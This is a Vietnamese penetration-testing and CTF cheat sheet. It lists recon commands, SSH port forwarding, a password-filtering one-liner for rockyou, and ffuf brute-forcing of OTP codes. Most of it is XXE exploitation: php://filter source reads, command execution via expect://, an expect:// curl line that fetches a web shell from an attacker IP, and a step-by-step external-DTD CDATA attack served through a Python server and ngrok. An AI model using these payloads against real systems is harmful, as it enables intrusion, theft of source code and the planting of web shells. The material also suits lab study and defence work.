# Penetration Testing & CTF Cheat Sheet

Một bảng tra cứu nhanh (Cheat Sheet) các lệnh hữu ích phục vụ cho quá trình Pentest, CTF, leo thang đặc quyền và khai thác lỗ hổng Web (XXE).

---

## 1. Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)

### Kiểm tra các file có quyền SUID (Set Owner User ID)
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Kiểm tra các tiến trình đang chạy ẩn nội bộ của quyền root
```bash
ps aux | grep root
```

### Kiểm tra các cổng đang lắng nghe (Dùng `netstat`)
```bash
netstat -tulnp
```

### Kiểm tra các cổng đang lắng nghe (Dùng `ss` nếu không có `netstat`)
```bash
ss -tulnp
```

---

## 2. Kết Nối Từ Xa & Chuyển Tiếp Cổng (Port Forwarding)

### Chuyển cổng (Local Port Forwarding) qua SSH
```bash
ssh -L 2121:127.0.0.1:21 sshuser@154.57.164.72 -p 31873
```

### Kết nối từ xa trên Windows
Sử dụng công cụ mặc định: `Remote Desktop Connection` (RDP).

### Kết nối từ xa từ Linux sang Windows (Dùng `xfreerdp`)
```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

---

## 3. Xử Lý Wordlist & Biến Đổi Chuỗi (Data Manipulation)

### Lọc mật khẩu theo Regex
*Điều kiện: Độ dài >= 10, chứa ít nhất 1 chữ hoa, 1 chữ thường và 1 chữ số.*
```bash
awk 'length(\$0) >= 10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' rockyou.txt > pass_da_loc.txt
```

### Tạo chuỗi số tăng dần có độ dài bằng nhau (Cờ `-w` thêm số 0 ở trước)
```bash
seq -w 1 9999
```

### Xử lý chuỗi nhanh trên Linux
* `echo -n "chuỗi"`: Không tự động thêm ký tự xuống dòng (`\n`) ở cuối.
* `base64 -w 0`: Mã hóa Base64 và ép toàn bộ kết quả hiển thị trên một dòng duy nhất.
* `tr -d ' -'`: Xóa toàn bộ dấu cách (khoảng trắng) và dấu gạch ngang (`-`) trong chuỗi.

---

## 4. Tấn Công Dò Thám (Brute Force)

### Brute force mã OTP bằng `ffuf`
```bash
ffuf -w <FILE_NAME> -u <TARGET_HOST> -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "session=<SESSION_COOKIE>" \
     -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

---

## 5. Khai Thác Lỗ Hổng XXE Injection

### Mã hóa nội dung bằng PHP Filter để đọc file mã nguồn (Tránh lỗi định dạng)
```xml
<!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=abc.php">
```

### Thực thi lệnh hệ thống qua XXE (Yêu cầu target cài module `expect`)
```xml
<!ENTITY company SYSTEM "expect://id">
```

### Tải Web Shell về server mục tiêu thông qua XXE (Sử dụng `$IFS` thay khoảng trắng)
```xml
<!ENTITY company SYSTEM "expect://curlIFS-OIFS'OUR_IP/shell.php'">
```

### Đọc file chứa ký tự đặc biệt bằng cách bọc trong thẻ CDATA
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % joined "&begin;&file;&end;">
]>
```

# Khai thác Nâng cao Lỗ hổng XXE bằng CDATA và External DTD

Hướng dẫn từng bước sử dụng kỹ thuật cấu hình tệp DTD bên ngoài kết hợp với thẻ `CDATA` để đọc mã nguồn hoặc dữ liệu nhị phân từ máy chủ mục tiêu thông qua lỗ hổng XML External Entity (XXE).

---

## 📌 Tổng quan Kịch bản
Khi máy chủ mục tiêu chạy các ứng dụng không phải PHP (hoặc không thể dùng bộ lọc `php://filter` để encode base64), việc đọc trực tiếp các tệp có chứa ký tự đặc biệt như `<`, `>`, `&` sẽ làm hỏng cấu trúc XML và gây lỗi hệ thống.

Để giải quyết, chúng ta cần bọc nội dung tệp vào giữa cặp thẻ `<![CDATA[` và `]]>`. Do XML cấm nối chuỗi trực tiếp thực thể nội bộ và bên ngoài tại DTD gốc, ta bắt buộc phải sử dụng **XML Parameter Entities (`%`)** được nạp từ một máy chủ từ xa của kẻ tấn công để lách qua cơ chế bảo mật này.

---

## 🛠 Các bước thực hiện

### Bước 1: Tạo tệp DTD cấu hình nối chuỗi trên máy của bạn
Trên máy tấn công của bạn, khởi tạo một tệp cấu hình đặt tên là `xxe.dtd`. Tệp này chịu trách nhiệm nhận các thành phần thẻ CDATA, tệp mục tiêu và ghép chúng lại thành thực thể gọi là `joined`.

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

### Bước 2: Khởi tạo Web Server công khai để lưu trữ tệp DTD
Khởi chạy một HTTP Server tại cổng mong muốn (ví dụ: `8000`) để máy chủ mục tiêu có thể truy cập và tải tệp `xxe.dtd` về.

```bash
python3 -m http.server 8000
```

> 💡 **Mẹo:** Nếu máy mục tiêu nằm ở mạng ngoài (Internet) và máy bạn đang ở mạng nội bộ (NAT), hãy sử dụng thêm công cụ như `ngrok` để public cổng `8000` này ra internet:
> ```bash
> ngrok http 8000
> ```

### Bước 3: Gửi payload XXE trong HTTP Request tới mục tiêu
Chèn đoạn mã khai thác sau vào phần tiêu đề XML (`<!DOCTYPE ...>`) của gói tin HTTP Request gửi đến ứng dụng web mục tiêu. Hãy thay thế đường dẫn tệp cần đọc và địa chỉ IP hoặc URL ngrok công khai của bạn.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "https://ngrok-free.dev"> 
  %xxe;
]>
<root>
  <name>test</name>
  <tel>123456</tel>
  <!-- Gọi thực thể &joined; tại vị trí dữ liệu được phản hồi ra màn hình -->
  <email>&joined;</email> 
</root>
```

---

## 🔄 Cơ chế hoạt động của Payload
1. **Định nghĩa thành phần:** Máy chủ mục tiêu ghi nhận đầu thẻ `<![CDATA[` vào `%begin;`, nội dung tệp cần đọc vào `%file;`, và đuôi thẻ `]]>` vào `%end;`.
2. **Kích hoạt nạp tệp từ xa:** Khi gặp lệnh gọi `%xxe;` ở cuối khối DOCTYPE, trình phân tích XML Parser bắt buộc phải gửi một request HTTP đến server ngrok của bạn để tải file `xxe.dtd`.
3. **Vượt rào bảo mật:** Do dòng mã ghép chuỗi được nạp từ một nguồn bên ngoài (External Source), XML Parser sẽ coi toàn bộ các thực thể thành phần bên trong nó đều là "external". Giới hạn bảo mật bị phá bỏ, hệ thống cho phép ghép nối `%begin;%file;%end;` và khởi tạo thành công thực thể thông thường mang tên `&joined;`.
4. **Hiển thị kết quả:** Thẻ `<email>&joined;</email>` xuất dữ liệu mã nguồn của tệp mục tiêu ra màn hình dưới dạng văn bản thô nằm an toàn trong CDATA mà không làm vỡ cấu trúc XML ban đầu.

---

## ⚠️ Lưu ý quan trọng khi kiểm thử (Pentest)
* **Vòng lặp DOS:** Một số máy chủ web hiện đại cấu hình chặn việc tự tham chiếu tệp (Entity reference loop). Kỹ thuật này có thể không đọc được một số tệp hệ thống cốt lõi hoặc file cấu hình lớn nếu chúng gây ra vòng lặp.
* **Môi trường ứng dụng:** Để cuộc tấn công thành công, cấu hình XML Parser của ứng dụng mục tiêu bắt buộc phải bật tính năng xử lý External Entity (ví dụ trong PHP là `LIBXML_DTDLOAD` và `LIBXML_NOENT`).


---

## 6. Tài Nguyên & Danh Sách Hữu Ích (Wordlists & Datasets)

* **Danh sách Username phổ biến:** [SecLists Usernames](https://github.com)
* **Danh sách thông tin đăng nhập mặc định:** [SecLists Default Credentials](https://github.com)
* **Tài khoản mặc định của hệ thống điều khiển công nghiệp (ICS/SCADA):** [SCADAPASS](https://github.com)
* **Dữ liệu tên các thành phố trên thế giới:** [World Cities Dataset](https://github.com)

Tool xxe : XXEinjector
